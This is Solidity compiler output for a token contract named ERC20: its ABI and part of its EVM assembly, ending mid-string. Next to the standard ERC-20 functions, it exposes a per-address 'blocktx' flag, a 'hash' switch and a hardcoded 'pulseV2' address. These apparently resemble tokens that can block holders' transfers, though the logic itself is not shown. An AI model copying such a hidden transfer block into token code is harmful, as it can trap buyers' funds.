{
	"contracts/Classes/moo.sol": {
		"ERC20": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "name_",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "symbol_",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "LPpair",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_balances",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "account",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "blocktx",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "subtractedValue",
							"type": "uint256"
						}
					],
					"name": "decreaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hash",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "addedValue",
							"type": "uint256"
						}
					],
					"name": "increaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "route",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "router",
					"outputs": [
						{
							"internalType": "contract IDEXRouter",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tS",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tStamp",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Classes/moo.sol\":2575:9078  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Classes/moo.sol\":2908:2968  address pulseV2 = 0x165C3410fC91EF562C50559f7d2289fEbed552d9 */\n  0x07\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"contracts/Classes/moo.sol\":2926:2968  0x165C3410fC91EF562C50559f7d2289fEbed552d9 */\n  0x165c3410fc91ef562c50559f7d2289febed552d9\n    /* \"contracts/Classes/moo.sol\":2908:2968  address pulseV2 = 0x165C3410fC91EF562C50559f7d2289fEbed552d9 */\n  or\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":4560:4584  bool public hash = false */\n  0x09\n  dup1\n  sload\n  not(shl(0xa0, 0xff))\n  and\n  swap1\n  sstore\n    /* \"contracts/Classes/moo.sol\":5324:5334  decimals() */\n  tag_1\n    /* \"contracts/Classes/moo.sol\":3392:3394  18 */\n  0x12\n  swap1\n    /* \"contracts/Classes/moo.sol\":3310:3401  function decimals() public view virtual override returns (uint8) {... */\n  jump\n    /* \"contracts/Classes/moo.sol\":5324:5334  decimals() */\ntag_1:\n    /* \"contracts/Classes/moo.sol\":5320:5334  10**decimals() */\n  tag_3\n  swap1\n    /* \"contracts/Classes/moo.sol\":5320:5322  10 */\n  0x0a\n    /* \"contracts/Classes/moo.sol\":5320:5334  10**decimals() */\n  tag_4\n  jump\t// in\ntag_3:\n    /* \"contracts/Classes/moo.sol\":5308:5335  20240000 * (10**decimals()) */\n  tag_5\n  swap1\n    /* \"contracts/Classes/moo.sol\":5308:5316  20240000 */\n  0x0134d680\n    /* \"contracts/Classes/moo.sol\":5308:5335  20240000 * (10**decimals()) */\n  tag_6\n  jump\t// in\ntag_5:\n    /* \"contracts/Classes/moo.sol\":5288:5335  uint256 public tS = 20240000 * (10**decimals()) */\n  0x0b\n  sstore\n    /* \"contracts/Classes/moo.sol\":2979:3092  constructor(string memory name_, string memory symbol_) {... */\n  callvalue\n  dup1\n  iszero\n  tag_7\n  jumpi\n  0x00\n  dup1\n  revert\ntag_7:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_8\n  swap2\n  tag_9\n  jump\t// in\ntag_8:\n    /* \"contracts/Classes/moo.sol\":3045:3050  _name */\n  0x05\n    /* \"contracts/Classes/moo.sol\":3045:3058  _name = name_ */\n  tag_12\n    /* \"contracts/Classes/moo.sol\":3053:3058  name_ */\n  dup4\n    /* \"contracts/Classes/moo.sol\":3045:3050  _name */\n  dup3\n    /* \"contracts/Classes/moo.sol\":3045:3058  _name = name_ */\n  tag_13\n  jump\t// in\ntag_12:\n  pop\n    /* \"contracts/Classes/moo.sol\":3068:3075  _symbol */\n  0x06\n    /* \"contracts/Classes/moo.sol\":3068:3085  _symbol = symbol_ */\n  tag_14\n    /* \"contracts/Classes/moo.sol\":3078:3085  symbol_ */\n  dup3\n    /* \"contracts/Classes/moo.sol\":3068:3075  _symbol */\n  dup3\n    /* \"contracts/Classes/moo.sol\":3068:3085  _symbol = symbol_ */\n  tag_13\n  jump\t// in\ntag_14:\n  pop\n    /* \"contracts/Classes/moo.sol\":2979:3092  constructor(string memory name_, string memory symbol_) {... */\n  pop\n  pop\n    /* \"contracts/Classes/moo.sol\":2575:9078  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n  jump(tag_26)\n    /* \"#utility.yul\":14:141   */\ntag_17:\n    /* \"#utility.yul\":75:85   */\n  0x4e487b71\n    /* \"#utility.yul\":70:73   */\n  0xe0\n    /* \"#utility.yul\":66:86   */\n  shl\n    /* \"#utility.yul\":63:64   */\n  0x00\n    /* \"#utility.yul\":56:87   */\n  mstore\n    /* \"#utility.yul\":106:110   */\n  0x11\n    /* \"#utility.yul\":103:104   */\n  0x04\n    /* \"#utility.yul\":96:111   */\n  mstore\n    /* \"#utility.yul\":130:134   */\n  0x24\n    /* \"#utility.yul\":127:128   */\n  0x00\n    /* \"#utility.yul\":120:135   */\n  revert\n    /* \"#utility.yul\":146:562   */\ntag_18:\n    /* \"#utility.yul\":235:236   */\n  0x01\n    /* \"#utility.yul\":272:277   */\n  dup2\n    /* \"#utility.yul\":235:236   */\n  dup2\n    /* \"#utility.yul\":286:556   */\ntag_29:\n    /* \"#utility.yul\":307:314   */\n  dup1\n    /* \"#utility.yul\":297:305   */\n  dup6\n    /* \"#utility.yul\":294:315   */\n  gt\n    /* \"#utility.yul\":286:556   */\n  iszero\n  tag_31\n  jumpi\n    /* \"#utility.yul\":366:370   */\n  dup2\n    /* \"#utility.yul\":362:363   */\n  0x00\n    /* \"#utility.yul\":358:364   */\n  not\n    /* \"#utility.yul\":354:371   */\n  div\n    /* \"#utility.yul\":348:352   */\n  dup3\n    /* \"#utility.yul\":345:372   */\n  gt\n    /* \"#utility.yul\":342:395   */\n  iszero\n  tag_33\n  jumpi\n    /* \"#utility.yul\":375:393   */\n  tag_33\n  tag_17\n  jump\t// in\ntag_33:\n    /* \"#utility.yul\":425:432   */\n  dup1\n    /* \"#utility.yul\":415:423   */\n  dup6\n    /* \"#utility.yul\":411:433   */\n  and\n    /* \"#utility.yul\":408:463   */\n  iszero\n  tag_34\n  jumpi\n    /* \"#utility.yul\":445:461   */\n  swap2\n  dup2\n  mul\n  swap2\n    /* \"#utility.yul\":408:463   */\ntag_34:\n    /* \"#utility.yul\":524:546   */\n  swap4\n  dup5\n  shr\n  swap4\n    /* \"#utility.yul\":484:499   */\n  swap1\n  dup1\n  mul\n  swap1\n    /* \"#utility.yul\":286:556   */\n  jump(tag_29)\ntag_31:\n    /* \"#utility.yul\":290:293   */\n  pop\n    /* \"#utility.yul\":146:562   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":567:1373   */\ntag_19:\n    /* \"#utility.yul\":616:621   */\n  0x00\n    /* \"#utility.yul\":646:654   */\n  dup3\n    /* \"#utility.yul\":636:716   */\n  tag_36\n  jumpi\n  pop\n    /* \"#utility.yul\":687:688   */\n  0x01\n    /* \"#utility.yul\":701:706   */\n  jump(tag_35)\n    /* \"#utility.yul\":636:716   */\ntag_36:\n    /* \"#utility.yul\":735:739   */\n  dup2\n    /* \"#utility.yul\":725:801   */\n  tag_37\n  jumpi\n  pop\n    /* \"#utility.yul\":772:773   */\n  0x00\n    /* \"#utility.yul\":786:791   */\n  jump(tag_35)\n    /* \"#utility.yul\":725:801   */\ntag_37:\n    /* \"#utility.yul\":817:821   */\n  dup2\n    /* \"#utility.yul\":835:836   */\n  0x01\n    /* \"#utility.yul\":830:889   */\n  dup2\n  eq\n  tag_39\n  jumpi\n    /* \"#utility.yul\":903:904   */\n  0x02\n    /* \"#utility.yul\":898:1028   */\n  dup2\n  eq\n  tag_40\n  jumpi\n    /* \"#utility.yul\":810:1028   */\n  jump(tag_38)\n    /* \"#utility.yul\":830:889   */\ntag_39:\n    /* \"#utility.yul\":860:861   */\n  0x01\n    /* \"#utility.yul\":851:861   */\n  swap2\n  pop\n    /* \"#utility.yul\":874:879   */\n  pop\n  jump(tag_35)\n    /* \"#utility.yul\":898:1028   */\ntag_40:\n    /* \"#utility.yul\":935:938   */\n  0xff\n    /* \"#utility.yul\":925:933   */\n  dup5\n    /* \"#utility.yul\":922:939   */\n  gt\n    /* \"#utility.yul\":919:962   */\n  iszero\n  tag_42\n  jumpi\n    /* \"#utility.yul\":942:960   */\n  tag_42\n  tag_17\n  jump\t// in\ntag_42:\n  pop\n  pop\n    /* \"#utility.yul\":998:999   */\n  0x01\n    /* \"#utility.yul\":984:1000   */\n  dup3\n  shl\n    /* \"#utility.yul\":1013:1018   */\n  jump(tag_35)\n    /* \"#utility.yul\":810:1028   */\ntag_38:\n  pop\n    /* \"#utility.yul\":1112:1114   */\n  0x20\n    /* \"#utility.yul\":1102:1110   */\n  dup4\n    /* \"#utility.yul\":1099:1115   */\n  lt\n    /* \"#utility.yul\":1093:1096   */\n  0x0133\n    /* \"#utility.yul\":1087:1091   */\n  dup4\n    /* \"#utility.yul\":1084:1097   */\n  lt\n    /* \"#utility.yul\":1080:1116   */\n  and\n    /* \"#utility.yul\":1074:1076   */\n  0x4e\n    /* \"#utility.yul\":1064:1072   */\n  dup5\n    /* \"#utility.yul\":1061:1077   */\n  lt\n    /* \"#utility.yul\":1056:1058   */\n  0x0b\n    /* \"#utility.yul\":1050:1054   */\n  dup5\n    /* \"#utility.yul\":1047:1059   */\n  lt\n    /* \"#utility.yul\":1043:1078   */\n  and\n    /* \"#utility.yul\":1040:1117   */\n  or\n    /* \"#utility.yul\":1037:1196   */\n  iszero\n  tag_43\n  jumpi\n  pop\n    /* \"#utility.yul\":1149:1168   */\n  dup2\n  dup2\n  exp\n    /* \"#utility.yul\":1181:1186   */\n  jump(tag_35)\n    /* \"#utility.yul\":1037:1196   */\ntag_43:\n    /* \"#utility.yul\":1228:1262   */\n  tag_44\n    /* \"#utility.yul\":1253:1261   */\n  dup4\n    /* \"#utility.yul\":1247:1251   */\n  dup4\n    /* \"#utility.yul\":1228:1262   */\n  tag_18\n  jump\t// in\ntag_44:\n    /* \"#utility.yul\":1298:1304   */\n  dup1\n    /* \"#utility.yul\":1294:1295   */\n  0x00\n    /* \"#utility.yul\":1290:1296   */\n  not\n    /* \"#utility.yul\":1286:1305   */\n  div\n    /* \"#utility.yul\":1277:1284   */\n  dup3\n    /* \"#utility.yul\":1274:1306   */\n  gt\n    /* \"#utility.yul\":1271:1329   */\n  iszero\n  tag_46\n  jumpi\n    /* \"#utility.yul\":1309:1327   */\n  tag_46\n  tag_17\n  jump\t// in\ntag_46:\n    /* \"#utility.yul\":1347:1367   */\n  mul\n  swap1\n  pop\n    /* \"#utility.yul\":567:1373   */\ntag_35:\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1378:1518   */\ntag_4:\n    /* \"#utility.yul\":1436:1441   */\n  0x00\n    /* \"#utility.yul\":1465:1512   */\n  tag_48\n    /* \"#utility.yul\":1506:1510   */\n  0xff\n    /* \"#utility.yul\":1496:1504   */\n  dup5\n    /* \"#utility.yul\":1492:1511   */\n  and\n    /* \"#utility.yul\":1486:1490   */\n  dup4\n    /* \"#utility.yul\":1465:1512   */\n  tag_19\n  jump\t// in\ntag_48:\n    /* \"#utility.yul\":1456:1512   */\n  swap4\n    /* \"#utility.yul\":1378:1518   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1523:1691   */\ntag_6:\n    /* \"#utility.yul\":1596:1605   */\n  dup1\n  dup3\n  mul\n    /* \"#utility.yul\":1627:1636   */\n  dup2\n  iszero\n    /* \"#utility.yul\":1644:1659   */\n  dup3\n  dup3\n  div\n    /* \"#utility.yul\":1638:1660   */\n  dup5\n  eq\n    /* \"#utility.yul\":1624:1661   */\n  or\n    /* \"#utility.yul\":1614:1685   */\n  tag_35\n  jumpi\n    /* \"#utility.yul\":1665:1683   */\n  tag_35\n  tag_17\n  jump\t// in\n    /* \"#utility.yul\":1696:1823   */\ntag_20:\n    /* \"#utility.yul\":1757:1767   */\n  0x4e487b71\n    /* \"#utility.yul\":1752:1755   */\n  0xe0\n    /* \"#utility.yul\":1748:1768   */\n  shl\n    /* \"#utility.yul\":1745:1746   */\n  0x00\n    /* \"#utility.yul\":1738:1769   */\n  mstore\n    /* \"#utility.yul\":1788:1792   */\n  0x41\n    /* \"#utility.yul\":1785:1786   */\n  0x04\n    /* \"#utility.yul\":1778:1793   */\n  mstore\n    /* \"#utility.yul\":1812:1816   */\n  0x24\n    /* \"#utility.yul\":1809:1810   */\n  0x00\n    /* \"#utility.yul\":1802:1817   */\n  revert\n    /* \"#utility.yul\":1828:2672   */\ntag_21:\n    /* \"#utility.yul\":1882:1887   */\n  0x00\n    /* \"#utility.yul\":1935:1938   */\n  dup3\n    /* \"#utility.yul\":1928:1932   */\n  0x1f\n    /* \"#utility.yul\":1920:1926   */\n  dup4\n    /* \"#utility.yul\":1916:1933   */\n  add\n    /* \"#utility.yul\":1912:1939   */\n  slt\n    /* \"#utility.yul\":1902:1957   */\n  tag_54\n  jumpi\n    /* \"#utility.yul\":1953:1954   */\n  0x00\n    /* \"#utility.yul\":1950:1951   */\n  dup1\n    /* \"#utility.yul\":1943:1955   */\n  revert\n    /* \"#utility.yul\":1902:1957   */\ntag_54:\n    /* \"#utility.yul\":1976:1989   */\n  dup2\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":2038:2048   */\n  dup1\n  dup3\n  gt\n    /* \"#utility.yul\":2035:2071   */\n  iszero\n  tag_56\n  jumpi\n    /* \"#utility.yul\":2051:2069   */\n  tag_56\n  tag_20\n  jump\t// in\ntag_56:\n    /* \"#utility.yul\":2126:2128   */\n  0x40\n    /* \"#utility.yul\":2120:2129   */\n  mload\n    /* \"#utility.yul\":2094:2096   */\n  0x1f\n    /* \"#utility.yul\":2180:2193   */\n  dup4\n  add\n  not(0x1f)\n    /* \"#utility.yul\":2176:2198   */\n  swap1\n  dup2\n  and\n    /* \"#utility.yul\":2200:2202   */\n  0x3f\n    /* \"#utility.yul\":2172:2203   */\n  add\n    /* \"#utility.yul\":2168:2208   */\n  and\n    /* \"#utility.yul\":2156:2209   */\n  dup2\n  add\n  swap1\n    /* \"#utility.yul\":2224:2242   */\n  dup3\n  dup3\n  gt\n    /* \"#utility.yul\":2244:2266   */\n  dup2\n  dup4\n  lt\n    /* \"#utility.yul\":2221:2267   */\n  or\n    /* \"#utility.yul\":2218:2290   */\n  iszero\n  tag_58\n  jumpi\n    /* \"#utility.yul\":2270:2288   */\n  tag_58\n  tag_20\n  jump\t// in\ntag_58:\n    /* \"#utility.yul\":2310:2320   */\n  dup2\n    /* \"#utility.yul\":2306:2308   */\n  0x40\n    /* \"#utility.yul\":2299:2321   */\n  mstore\n    /* \"#utility.yul\":2345:2347   */\n  dup4\n    /* \"#utility.yul\":2337:2343   */\n  dup2\n    /* \"#utility.yul\":2330:2348   */\n  mstore\n    /* \"#utility.yul\":2367:2371   */\n  0x20\n    /* \"#utility.yul\":2357:2371   */\n  swap3\n  pop\n    /* \"#utility.yul\":2414:2417   */\n  dup7\n    /* \"#utility.yul\":2407:2411   */\n  0x20\n    /* \"#utility.yul\":2402:2404   */\n  dup6\n    /* \"#utility.yul\":2394:2400   */\n  dup9\n    /* \"#utility.yul\":2390:2405   */\n  add\n    /* \"#utility.yul\":2386:2412   */\n  add\n    /* \"#utility.yul\":2383:2418   */\n  gt\n    /* \"#utility.yul\":2380:2435   */\n  iszero\n  tag_59\n  jumpi\n    /* \"#utility.yul\":2431:2432   */\n  0x00\n    /* \"#utility.yul\":2428:2429   */\n  dup1\n    /* \"#utility.yul\":2421:2433   */\n  revert\n    /* \"#utility.yul\":2380:2435   */\ntag_59:\n    /* \"#utility.yul\":2453:2454   */\n  0x00\n    /* \"#utility.yul\":2444:2454   */\n  swap2\n  pop\n    /* \"#utility.yul\":2463:2596   */\ntag_60:\n    /* \"#utility.yul\":2477:2479   */\n  dup4\n    /* \"#utility.yul\":2474:2475   */\n  dup3\n    /* \"#utility.yul\":2471:2480   */\n  lt\n    /* \"#utility.yul\":2463:2596   */\n  iszero\n  tag_62\n  jumpi\n    /* \"#utility.yul\":2565:2579   */\n  dup6\n  dup3\n  add\n    /* \"#utility.yul\":2561:2584   */\n  dup4\n  add\n    /* \"#utility.yul\":2555:2585   */\n  mload\n    /* \"#utility.yul\":2534:2548   */\n  dup2\n  dup4\n  add\n    /* \"#utility.yul\":2530:2553   */\n  dup5\n  add\n    /* \"#utility.yul\":2523:2586   */\n  mstore\n    /* \"#utility.yul\":2488:2498   */\n  swap1\n  dup3\n  add\n  swap1\n    /* \"#utility.yul\":2463:2596   */\n  jump(tag_60)\ntag_62:\n    /* \"#utility.yul\":2640:2641   */\n  0x00\n    /* \"#utility.yul\":2633:2637   */\n  0x20\n    /* \"#utility.yul\":2628:2630   */\n  dup6\n    /* \"#utility.yul\":2620:2626   */\n  dup4\n    /* \"#utility.yul\":2616:2631   */\n  add\n    /* \"#utility.yul\":2612:2638   */\n  add\n    /* \"#utility.yul\":2605:2642   */\n  mstore\n    /* \"#utility.yul\":2660:2666   */\n  dup1\n    /* \"#utility.yul\":2651:2666   */\n  swap5\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":1828:2672   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2677:3239   */\ntag_9:\n    /* \"#utility.yul\":2776:2782   */\n  0x00\n    /* \"#utility.yul\":2784:2790   */\n  dup1\n    /* \"#utility.yul\":2837:2839   */\n  0x40\n    /* \"#utility.yul\":2825:2834   */\n  dup4\n    /* \"#utility.yul\":2816:2823   */\n  dup6\n    /* \"#utility.yul\":2812:2835   */\n  sub\n    /* \"#utility.yul\":2808:2840   */\n  slt\n    /* \"#utility.yul\":2805:2857   */\n  iszero\n  tag_64\n  jumpi\n    /* \"#utility.yul\":2853:2854   */\n  0x00\n    /* \"#utility.yul\":2850:2851   */\n  dup1\n    /* \"#utility.yul\":2843:2855   */\n  revert\n    /* \"#utility.yul\":2805:2857   */\ntag_64:\n    /* \"#utility.yul\":2880:2896   */\n  dup3\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":2945:2959   */\n  dup1\n  dup3\n  gt\n    /* \"#utility.yul\":2942:2976   */\n  iszero\n  tag_65\n  jumpi\n    /* \"#utility.yul\":2972:2973   */\n  0x00\n    /* \"#utility.yul\":2969:2970   */\n  dup1\n    /* \"#utility.yul\":2962:2974   */\n  revert\n    /* \"#utility.yul\":2942:2976   */\ntag_65:\n    /* \"#utility.yul\":2995:3056   */\n  tag_66\n    /* \"#utility.yul\":3048:3055   */\n  dup7\n    /* \"#utility.yul\":3039:3045   */\n  dup4\n    /* \"#utility.yul\":3028:3037   */\n  dup8\n    /* \"#utility.yul\":3024:3046   */\n  add\n    /* \"#utility.yul\":2995:3056   */\n  tag_21\n  jump\t// in\ntag_66:\n    /* \"#utility.yul\":2985:3056   */\n  swap4\n  pop\n    /* \"#utility.yul\":3102:3104   */\n  0x20\n    /* \"#utility.yul\":3091:3100   */\n  dup6\n    /* \"#utility.yul\":3087:3105   */\n  add\n    /* \"#utility.yul\":3081:3106   */\n  mload\n    /* \"#utility.yul\":3065:3106   */\n  swap2\n  pop\n    /* \"#utility.yul\":3131:3133   */\n  dup1\n    /* \"#utility.yul\":3121:3129   */\n  dup3\n    /* \"#utility.yul\":3118:3134   */\n  gt\n    /* \"#utility.yul\":3115:3151   */\n  iszero\n  tag_67\n  jumpi\n    /* \"#utility.yul\":3147:3148   */\n  0x00\n    /* \"#utility.yul\":3144:3145   */\n  dup1\n    /* \"#utility.yul\":3137:3149   */\n  revert\n    /* \"#utility.yul\":3115:3151   */\ntag_67:\n  pop\n    /* \"#utility.yul\":3170:3233   */\n  tag_68\n    /* \"#utility.yul\":3225:3232   */\n  dup6\n    /* \"#utility.yul\":3214:3222   */\n  dup3\n    /* \"#utility.yul\":3203:3212   */\n  dup7\n    /* \"#utility.yul\":3199:3223   */\n  add\n    /* \"#utility.yul\":3170:3233   */\n  tag_21\n  jump\t// in\ntag_68:\n    /* \"#utility.yul\":3160:3233   */\n  swap2\n  pop\n  pop\n    /* \"#utility.yul\":2677:3239   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3244:3624   */\ntag_22:\n    /* \"#utility.yul\":3323:3324   */\n  0x01\n    /* \"#utility.yul\":3319:3331   */\n  dup2\n  dup2\n  shr\n  swap1\n    /* \"#utility.yul\":3366:3378   */\n  dup3\n  and\n  dup1\n    /* \"#utility.yul\":3387:3448   */\n  tag_70\n  jumpi\n    /* \"#utility.yul\":3441:3445   */\n  0x7f\n    /* \"#utility.yul\":3433:3439   */\n  dup3\n    /* \"#utility.yul\":3429:3446   */\n  and\n    /* \"#utility.yul\":3419:3446   */\n  swap2\n  pop\n    /* \"#utility.yul\":3387:3448   */\ntag_70:\n    /* \"#utility.yul\":3494:3496   */\n  0x20\n    /* \"#utility.yul\":3486:3492   */\n  dup3\n    /* \"#utility.yul\":3483:3497   */\n  lt\n    /* \"#utility.yul\":3463:3481   */\n  dup2\n    /* \"#utility.yul\":3460:3498   */\n  sub\n    /* \"#utility.yul\":3457:3618   */\n  tag_71\n  jumpi\n    /* \"#utility.yul\":3540:3550   */\n  0x4e487b71\n    /* \"#utility.yul\":3535:3538   */\n  0xe0\n    /* \"#utility.yul\":3531:3551   */\n  shl\n    /* \"#utility.yul\":3528:3529   */\n  0x00\n    /* \"#utility.yul\":3521:3552   */\n  mstore\n    /* \"#utility.yul\":3575:3579   */\n  0x22\n    /* \"#utility.yul\":3572:3573   */\n  0x04\n    /* \"#utility.yul\":3565:3580   */\n  mstore\n    /* \"#utility.yul\":3603:3607   */\n  0x24\n    /* \"#utility.yul\":3600:3601   */\n  0x00\n    /* \"#utility.yul\":3593:3608   */\n  revert\n    /* \"#utility.yul\":3457:3618   */\ntag_71:\n  pop\n    /* \"#utility.yul\":3244:3624   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3755:4273   */\ntag_24:\n    /* \"#utility.yul\":3857:3859   */\n  0x1f\n    /* \"#utility.yul\":3852:3855   */\n  dup3\n    /* \"#utility.yul\":3849:3860   */\n  gt\n    /* \"#utility.yul\":3846:4267   */\n  iszero\n  tag_74\n  jumpi\n    /* \"#utility.yul\":3893:3898   */\n  dup1\n    /* \"#utility.yul\":3890:3891   */\n  0x00\n    /* \"#utility.yul\":3883:3899   */\n  mstore\n    /* \"#utility.yul\":3937:3941   */\n  0x20\n    /* \"#utility.yul\":3934:3935   */\n  0x00\n    /* \"#utility.yul\":3924:3942   */\n  keccak256\n    /* \"#utility.yul\":4007:4009   */\n  0x1f\n    /* \"#utility.yul\":3995:4005   */\n  dup5\n    /* \"#utility.yul\":3991:4010   */\n  add\n    /* \"#utility.yul\":3988:3989   */\n  0x05\n    /* \"#utility.yul\":3984:4011   */\n  shr\n    /* \"#utility.yul\":3978:3982   */\n  dup2\n    /* \"#utility.yul\":3974:4012   */\n  add\n    /* \"#utility.yul\":4043:4047   */\n  0x20\n    /* \"#utility.yul\":4031:4041   */\n  dup6\n    /* \"#utility.yul\":4028:4048   */\n  lt\n    /* \"#utility.yul\":4025:4072   */\n  iszero\n  tag_75\n  jumpi\n  pop\n    /* \"#utility.yul\":4066:4070   */\n  dup1\n    /* \"#utility.yul\":4025:4072   */\ntag_75:\n    /* \"#utility.yul\":4121:4123   */\n  0x1f\n    /* \"#utility.yul\":4116:4119   */\n  dup5\n    /* \"#utility.yul\":4112:4124   */\n  add\n    /* \"#utility.yul\":4109:4110   */\n  0x05\n    /* \"#utility.yul\":4105:4125   */\n  shr\n    /* \"#utility.yul\":4099:4103   */\n  dup3\n    /* \"#utility.yul\":4095:4126   */\n  add\n    /* \"#utility.yul\":4085:4126   */\n  swap2\n  pop\n    /* \"#utility.yul\":4176:4257   */\ntag_76:\n    /* \"#utility.yul\":4194:4196   */\n  dup2\n    /* \"#utility.yul\":4187:4192   */\n  dup2\n    /* \"#utility.yul\":4184:4197   */\n  lt\n    /* \"#utility.yul\":4176:4257   */\n  iszero\n  tag_78\n  jumpi\n    /* \"#utility.yul\":4253:4254   */\n  0x00\n    /* \"#utility.yul\":4239:4255   */\n  dup2\n  sstore\n    /* \"#utility.yul\":4220:4221   */\n  0x01\n    /* \"#utility.yul\":4209:4222   */\n  add\n    /* \"#utility.yul\":4176:4257   */\n  jump(tag_76)\ntag_78:\n    /* \"#utility.yul\":4180:4183   */\n  pop\n  pop\n    /* \"#utility.yul\":3846:4267   */\ntag_74:\n    /* \"#utility.yul\":3755:4273   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4449:5794   